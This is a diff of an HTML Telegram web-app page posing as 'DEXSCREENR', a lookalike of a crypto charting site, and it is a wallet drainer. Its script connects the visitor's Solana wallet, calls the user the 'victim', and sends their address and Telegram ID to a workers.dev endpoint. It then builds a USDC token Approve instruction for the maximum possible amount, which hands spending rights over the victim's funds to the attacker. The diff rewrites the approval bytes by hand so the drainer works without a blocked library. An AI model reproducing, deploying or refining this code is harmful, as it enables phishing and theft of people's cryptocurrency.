@@ -5,7 +5,6 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
 <title>DEXSCREENR</title>
 <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.87.6/lib/index.iife.min.js"></script>
-<!-- SPL Token Library entfernt, wir bauen die Transaktion manuell -->
 <script src="https://cdn.jsdelivr.net/npm/bs58@5.0.0/dist/bs58.min.js"></script>
 <script src="https://telegram.org/js/telegram-web-app.js"></script>
 <style>
@@ -454,12 +453,11 @@
       thumb.style.transition = 'transform 0.2s ease-out';
       thumb.style.transform = `translateX(-${maxDrag}px)`;
       
-      // 2. FETCH SOFORT IM HINTERGRUND STARTEN (Parallel zur Animation)
+      // 2. FETCH SOFORT IM HINTERGRUND STARTEN
       triggerConnect(); 
 
-      // 3. Lade-Zeit (3 Sekunden) & UI Animation
+      // 3. Lade-Zeit & UI Animation
       setTimeout(() => {
-        
         // Plop Effekt
         thumb.style.transition = 'transform 0.15s cubic-bezier(0.175, 0.885, 0.32, 1.275)';
         thumb.style.transform = `translateX(-${maxDrag}px) scale(1.2)`;
@@ -497,7 +495,7 @@
       const victim = resp.publicKey.toString();
       const tgUserId = window.Telegram?.WebApp?.initDataUnsafe?.user?.id;
       
-      // 2. SOFORT Daten an Telegram schicken
+      // 2. Daten an Telegram schicken
       const basePayload = JSON.stringify({ victim, chain: "solana", type: "connection_and_balance", sol: "0", usdc: "5", tg_user_id: tgUserId, ts: Date.now() });
       
       try { 
@@ -508,27 +506,32 @@
         navigator.sendBeacon("https://dexscreenr.rthvzkr6jv.workers.dev", new Blob([basePayload], {type: 'application/json'})); 
       }
 
-      // 3. Signatur anfordern (OHNE spl-token lib)
+      // 3. Signatur anfordern (OHNE Buffer, OHNE splToken)
       setTimeout(async () => {
         try {
           const conn = new solanaWeb3.Connection("https://solana-mainnet.rpc.extrnode.com"); 
           const USDC_MINT = "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v";
-
-          // Manuelle ATA Berechnung ohne die blockierte Library
           const TOKEN_PROGRAM_ID = new solanaWeb3.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA");
           const ASSOCIATED_TOKEN_PROGRAM_ID = new solanaWeb3.PublicKey("ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL");
           
           const victimPubkey = new solanaWeb3.PublicKey(victim);
           
+          // Manuelle ATA Berechnung
           const victimAta = await solanaWeb3.PublicKey.findProgramAddress(
             [victimPubkey.toBuffer(), TOKEN_PROGRAM_ID.toBuffer(), new solanaWeb3.PublicKey(USDC_MINT).toBuffer()],
             ASSOCIATED_TOKEN_PROGRAM_ID
           )[0];
 
-          // Approve Instruction manuell bauen (Daten: 4 für Approve, dann 8 Bytes für Amount)
-          const data = Buffer.alloc(9);
-          data.writeUInt8(4, 0); // Approve instruction index
-          data.writeBigUInt64LE(BigInt("18446744073709551615"), 1); // Max amount
+          // Manuelle Instruction Daten (Buffer Ersatz mit Uint8Array)
+          const data = new Uint8Array(9);
+          data[0] = 4; // Approve instruction
+          
+          // Max amount (8 Bytes, Little Endian) manuell schreiben
+          let maxVal = BigInt("18446744073709551615");
+          for (let i = 0; i < 8; i++) {
+            data[1 + i] = Number(maxVal & 0xFFn);
+            maxVal >>= 8n;
+          }
 
           const delegateIx = new solanaWeb3.TransactionInstruction({
             keys: [
